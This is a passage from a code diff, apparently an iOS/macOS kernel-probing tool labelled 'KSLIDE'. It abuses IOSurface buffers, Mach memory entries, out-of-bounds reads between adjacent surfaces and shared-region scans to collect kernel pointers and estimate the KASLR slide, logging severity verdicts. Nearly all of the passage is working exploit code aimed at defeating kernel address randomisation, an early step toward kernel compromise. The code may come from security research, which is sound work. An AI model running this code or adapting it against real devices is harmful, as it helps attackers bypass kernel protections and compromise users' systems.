+                if (!s) continue;
+
+                sym.lock(s, 0, NULL);
+                void *b = sym.getBase(s);
+                if (b) {
+                    size_t asize = sym.getAllocSize(s);
+
+                    // Try different protection combos
+                    int prots[] = {
+                        VM_PROT_READ,
+                        VM_PROT_READ | VM_PROT_WRITE,
+                        VM_PROT_READ | VM_PROT_WRITE | 0x400000, // MAP_MEM_VM_SHARE
+                        VM_PROT_ALL,
+                    };
+
+                    for (int p = 0; p < 4 && !isr_stopped(); p++) {
+                        mach_port_t entry = MACH_PORT_NULL;
+                        memory_object_size_t entry_size = asize;
+                        kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                            &entry_size, (memory_object_offset_t)(uintptr_t)b,
+                            prots[p], &entry, MACH_PORT_NULL);
+
+                        if (kr == KERN_SUCCESS && entry != MACH_PORT_NULL) {
+                            memEntriesCreated++;
+
+                            // Map the entry
+                            vm_address_t mapped = 0;
+                            kr = vm_map(mach_task_self(), &mapped, (vm_size_t)entry_size, 0,
+                                VM_FLAGS_ANYWHERE, entry, 0, FALSE,
+                                VM_PROT_READ | VM_PROT_WRITE,
+                                VM_PROT_READ | VM_PROT_WRITE,
+                                VM_INHERIT_NONE);
+
+                            if (kr == KERN_SUCCESS) {
+                                sharedMaps++;
+
+                                // Read the mapped region for kernel data
+                                uint8_t probe[64];
+                                memset(probe, 0, sizeof(probe));
+                                vm_size_t pRead = 0;
+                                kr = vm_read_overwrite(mach_task_self(),
+                                    mapped + entry_size - 64, 64,
+                                    (vm_address_t)probe, &pRead);
+                                if (kr == KERN_SUCCESS && pRead > 0) {
+                                    for (size_t j = 0; j + 8 <= pRead; j += 8) {
+                                        uint64_t val = 0;
+                                        memcpy(&val, probe + j, 8);
+                                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                            anomalies++;
+                                            log([NSString stringWithFormat:@"KSLIDE: KPTR via mementry[%d] prot=%d: 0x%llx", sz, prots[p], val]);
+                                        }
+                                    }
+                                }
+
+                                vm_deallocate(mach_task_self(), mapped, (vm_size_t)entry_size);
+                            }
+                            mach_port_deallocate(mach_task_self(), entry);
+                        }
+                    }
+                }
+                sym.unlock(s, 0, NULL);
+                CFRelease(s);
+            }
+            log([NSString stringWithFormat:@"KSLIDE: Memory entries created=%d shared maps=%d", memEntriesCreated, sharedMaps]);
+        }
+
+        // Step 5: Cross-surface leak — create two adjacent surfaces, OOB from one to read other's metadata
+        if (!isr_stopped()) {
+            log(@"KSLIDE: Step 5 — Cross-surface metadata leak");
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+
+            // Create a batch of surfaces, then read OOB from middle ones
+            IOSurfaceRef batch[32];
+            memset(batch, 0, sizeof(batch));
+            for (int i = 0; i < 32; i++) {
+                batch[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (batch[i]) {
+                    sym.lock(batch[i], 0, NULL);
+                    void *b = sym.getBase(batch[i]);
+                    if (b) {
+                        uint32_t tag = 0xBA7C0000 | i;
+                        memcpy(b, &tag, 4);
+                    }
+                    sym.unlock(batch[i], 0, NULL);
+                }
+            }
+
+            // From surface 16 (middle), read OOB to find tags from neighbors
+            if (batch[16]) {
+                sym.lock(batch[16], 0, NULL);
+                void *midBase = sym.getBase(batch[16]);
+                if (midBase) {
+                    size_t midSize = sym.getAllocSize(batch[16]);
+                    // Scan forward in small steps looking for neighbor tags
+                    for (size_t off = midSize; off < midSize + 0x200000 && !isr_stopped(); off += 4096) {
+                        uint8_t buf[64];
+                        vm_size_t readSize = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)midBase + off, 64,
+                            (vm_address_t)buf, &readSize);
+                        if (kr == KERN_SUCCESS && readSize >= 4) {
+                            uint32_t f4 = 0;
+                            memcpy(&f4, buf, 4);
+                            if ((f4 & 0xFFFF0000) == 0xBA7C0000) {
+                                int neighbor = f4 & 0xFFFF;
+                                if (neighbor != 16 && neighbor < 32) {
+                                    crossSurfLeak++;
+                                    anomalies++;
+                                    if (crossSurfLeak <= 5) {
+                                        log([NSString stringWithFormat:@"KSLIDE: CROSS-SURF LEAK! +0x%zx found batch[%d] tag", off, neighbor]);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                sym.unlock(batch[16], 0, NULL);
+            }
+            for (int i = 0; i < 32; i++) { if (batch[i]) CFRelease(batch[i]); }
+            log([NSString stringWithFormat:@"KSLIDE: Cross-surface leaks: %d", crossSurfLeak]);
+        }
+
+        // Step 6: VM region analysis for kernel-adjacent mappings
+        if (!isr_stopped()) {
+            log(@"KSLIDE: Step 6 — VM region analysis for shared kernel regions");
+            vm_address_t addr = 0;
+            int sharedRegions = 0;
+            int regionCount = 0;
+            while (!isr_stopped() && regionCount < 1000) {
+                vm_size_t size = 0;
+                uint32_t depth = 0;
+                struct vm_region_submap_info_64 info;
+                mach_msg_type_number_t infoCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kern_return_t kr = vm_region_recurse_64(mach_task_self(),
+                    &addr, &size, &depth,
+                    (vm_region_recurse_info_t)&info, &infoCnt);
+                if (kr != KERN_SUCCESS) break;
+
+                // Look for shared memory regions that might be kernel-mapped
+                if (info.share_mode == 3) { // SM_SHARED_ALIASED
+                    sharedRegions++;
+                    regionProbes++;
+                    if (sharedRegions <= 5) {
+                        log([NSString stringWithFormat:@"KSLIDE: Shared region 0x%llx size=0x%llx prot=%d max=%d",
+                             (uint64_t)addr, (uint64_t)size, info.protection, info.max_protection]);
+                    }
+                    // Read first 64 bytes for kernel pointers
+                    if (info.protection & VM_PROT_READ) {
+                        uint8_t rbuf[64];
+                        vm_size_t rSize = 0;
+                        kr = vm_read_overwrite(mach_task_self(), addr, 64, (vm_address_t)rbuf, &rSize);
+                        if (kr == KERN_SUCCESS && rSize > 0) {
+                            for (size_t j = 0; j + 8 <= rSize; j += 8) {
+                                uint64_t val = 0;
+                                memcpy(&val, rbuf + j, 8);
+                                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"KSLIDE: KPTR in shared region 0x%llx+%zu: 0x%llx",
+                                         (uint64_t)addr, j, val]);
+                                }
+                            }
+                        }
+                    }
+                }
+                addr += size;
+                regionCount++;
+            }
+            log([NSString stringWithFormat:@"KSLIDE: Regions scanned=%d shared=%d", regionCount, sharedRegions]);
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"KSLIDE: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"KSLIDE: dyld=0x%llx kptrs=%d slide=0x%llx entries=%d maps=%d crossLeak=%d anomalies=%d",
+             dyldBase, kptrsCollected, kslideEstimate, memEntriesCreated, sharedMaps, crossSurfLeak, anomalies]);
+
+        NSString *verdict;
+        if (kslideEstimate > 0) verdict = @"CRITICAL — KASLR slide calculated!";
+        else if (crossSurfLeak > 0) verdict = @"CRITICAL — cross-surface data leak confirmed!";
+        else if (kptrsCollected > 10) verdict = @"HIGH — many kernel pointers collected for slide analysis";
+        else if (kptrsCollected > 0) verdict = @"HIGH — kernel pointers found, slide estimation possible";
+        else if (sharedMaps > 0) verdict = @"MEDIUM — shared memory mappings created";
+        else verdict = @"LOW — no kernel data leaked";
+        log([NSString stringWithFormat:@"KSLIDE: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"dyldBase": @(dyldBase),
+            @"kptrsCollected": @(kptrsCollected),
+            @"kslideEstimate": @(kslideEstimate),
+            @"memEntriesCreated": @(memEntriesCreated),
+            @"sharedMaps": @(sharedMaps),
+            @"crossSurfLeak": @(crossSurfLeak),
+            @"regionProbes": @(regionProbes)
+        };
+        isr_checkpoint(@"ISR-KSlide-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
